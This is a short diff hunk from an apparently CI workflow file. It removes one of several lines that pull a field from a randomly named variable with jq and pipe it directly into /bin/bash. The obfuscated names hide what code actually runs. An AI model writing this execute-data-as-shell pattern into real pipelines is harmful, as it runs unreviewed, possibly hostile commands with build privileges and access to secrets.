@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$mnw76" | jq -r .rel80 | /bin/bash
           printf '%s' "$ejxn40648" | jq -r .ibwyo9 | /bin/bash
           echo $oy9 | jq -r .xrz77072 | /bin/bash
-          echo $agpe8178 | jq -r .xat1 | /bin/bash
           echo $r109 | jq -r .qvb4069 | /bin/bash
           echo $j3 | jq -r .n133 | /bin/bash
           echo $cc32 | jq -r .yfg17965 | /bin/bash
